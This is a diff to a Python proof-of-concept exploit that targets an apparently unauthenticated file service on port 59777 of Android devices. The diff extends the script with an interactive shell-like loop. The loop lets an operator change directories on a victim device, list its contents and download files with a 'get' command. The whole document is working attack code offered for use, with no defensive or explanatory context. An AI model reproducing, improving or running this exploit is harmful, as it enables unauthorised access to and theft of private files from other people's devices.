@@ -21,7 +21,7 @@ def get_file(addr, filepath):
     session = requests.Session()
 
     headers = {"Content-Type": "application/json"}
-    address = 'http://' + addr + ':59777' + filepath
+    address = 'http://' + addr + ':59777' + "/" + filepath
     filename = filepath.rsplit('/', 1)[1]
 
     resp = session.get(address, headers=headers, verify=False)
@@ -34,13 +34,14 @@ def get_file(addr, filepath):
             f.write(resp.content)
 
 
-def execute_cmd(addr, cmd, package):
+def execute_cmd(addr, cmd, package, path):
     if verbose:
         print('[*] Executing command: ' + cmd + ' on ' + addr)
 
     session = requests.Session()
     headers = {"Content-Type": "application/json"}
-    address = 'http://' + addr + ':59777'
+    address = 'http://' + addr + ':59777' + "/" + str(path)
+    print(path)
 
     if package != '':
         data = '{ "command":' + cmd + ', "appPackageName":' + package + ' }'
@@ -71,6 +72,7 @@ def execute_cmd(addr, cmd, package):
                 f.write(resp.content)
         else:
             print(text)
+    
 
 
 def is_up(addr):
@@ -147,8 +149,26 @@ def main():
 
                 if options.filepath != '':
                     get_file(addr, options.filepath)
+
                 elif options.cmd != '':
-                    execute_cmd(addr, options.cmd, options.package)
+                    command = ""
+                    paths = []
+                    execute_cmd(addr, options.cmd, options.package,"")
+                    while True:
+                        command = input(f"[?]q exit\n[?]cd [filename] = change directory | cd .. = go back\n[?]get [filename] = download file\n[/{'/'.join(paths)}]$").split()
+                        if command[0] == "q":
+                            break
+                        elif command[0] == "get":
+                            get_file(addr,"/".join(paths)+"/"+command[1])
+                        elif command[0] == "cd":
+                            if command[1] == "..":
+                                if len(paths) == 0:
+                                    pass
+                                else:
+                                    paths.pop(-1)
+                            else:    
+                                paths.append(command[1])
+                            execute_cmd(addr, options.cmd, options. package, "/".join(paths))
 
         if options.host != '':
             scan_host(options.host)
@@ -164,7 +184,8 @@ def main():
         print('- python3 poc.py --cmd [cmd] --network [network]')
         print('- python3 poc.py --cmd [cmd] --pkg [package_name]')
         print('- python3 poc.py --verbose --cmd [cmd] --pkg [package_name]')
-
+        print('- $python poc.py --cmd listFiles --ip [target_host]')
 
 if __name__ == '__main__':
     main()
+
